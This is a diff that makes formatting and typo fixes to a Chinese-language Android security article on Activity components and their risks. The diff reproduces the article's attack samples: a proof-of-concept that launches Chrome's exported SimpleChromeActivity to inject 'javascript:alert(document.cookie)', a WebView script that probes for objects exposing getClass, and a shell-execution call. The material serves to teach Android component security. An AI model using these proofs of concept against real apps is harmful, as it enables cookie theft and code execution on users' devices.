@@ -31,8 +31,7 @@ Activity 是为用户操作而展示的可视化用户界面，比如说，一�
 Intent intent = new Intent(this, ExampleActivity.class);
 startActivity(intent);
 ```
-未配置intent-filter的action属性，activity只能使用显式启动。
-私有Activity推荐使用显式启动。
+未配置intent-filter的action属性，activity只能使用显式启动，私有Activity推荐使用显式启动。   
 隐式启动  
 ```
 Intent intent = new Intent(Intent.ACTION_SEND);
@@ -140,7 +139,7 @@ Activity类型和使用方式决定了其风险和防御方式,故将Activity分
 6、开启activity 时不设置FLAG_ACTIVITY_NEW_TASK 标签 //FLAG_ACTIVITY_NEW_TASK标签用于创建新task（被启动的Activity并未在栈中）。  
 7、开启应用内部activity使用显式启动的方式  
 8、当putExtra() 包含敏感信息目的应是app内的activity  
-9、谨慎处理返回数据，即可数据来自相同应用  
+9、谨慎处理返回数据，即使数据来自相同应用  
 
 ### public activity
 公开暴露的Activity 组件，可以被任意应用启动  
@@ -211,29 +210,29 @@ Class "com.google.android.apps.chrome.SimpleChromeActivity" 配置 但是未设�
 ``` java
 public class TestActivity extends Activity {
 @Override
-public void onCreate(Bundle savedInstanceState) {
-    super.onCreate(savedInstanceState);
-    Intent i = new Intent();
-            ComponentName comp = new ComponentName(
-                             "com.android.chrome",
-                                "com.google.android.apps.chrome.SimpleChromeActivity");
-            i.setComponent(comp);
-            i.setAction("android.intent.action.VIEW");
-            Uri data = Uri.parse("http://google.com");
-            i.setData(data);
-
-            startActivity(i);
-
-                try {
-                    Thread.sleep(5000);
-                    }
-                      catch (Exception e) {}
-
-            data = Uri.parse("javascript:alert(document.cookie)");  
-            i.setData(data);
-
-            startActivity(i);
-}
+	public void onCreate(Bundle savedInstanceState) {
+	    super.onCreate(savedInstanceState);
+	    Intent i = new Intent();
+	            ComponentName comp = new ComponentName(
+	                             "com.android.chrome",
+	                                "com.google.android.apps.chrome.SimpleChromeActivity");
+	            i.setComponent(comp);
+	            i.setAction("android.intent.action.VIEW");
+	            Uri data = Uri.parse("http://google.com");
+	            i.setData(data);
+	
+	            startActivity(i);
+	
+	                try {
+	                    Thread.sleep(5000);
+	                    }
+	                      catch (Exception e) {}
+	
+	            data = Uri.parse("javascript:alert(document.cookie)");  
+	            i.setData(data);
+	
+	            startActivity(i);
+	}
 }
 ```
 ### 案例4：隐式启动intent 包含敏感数据
@@ -293,32 +292,29 @@ execute(['/system/bin/sh','-c','echo  "hello" > /sdcard/check.txt']);
 
 function check()
 {
-for (var obj in window)
-{
-
-    try {
-
-        if ("getClass" in window[obj]) {
-
-            try{
-
-                window[obj].getClass();
-
-                document.write('<span style="color:red">'+obj+'</span>');
-
-                document.write('<br />');
-
-            }catch(e){
-
-                }
-
-        }
-
-    } catch(e) {
-
-        }
-
-}
+	for (var obj in window)
+	{	
+	    try {
+	
+	        if ("getClass" in window[obj]) {
+	
+	            try{
+	
+	                window[obj].getClass();
+	
+	                document.write('<span style="color:red">'+obj+'</span>');
+	
+	                document.write('<br />');
+	
+	            }catch(e){
+	
+	                }
+	
+	        }
+	    } catch(e) {
+	
+	        }	
+	}
 }
 
 check();
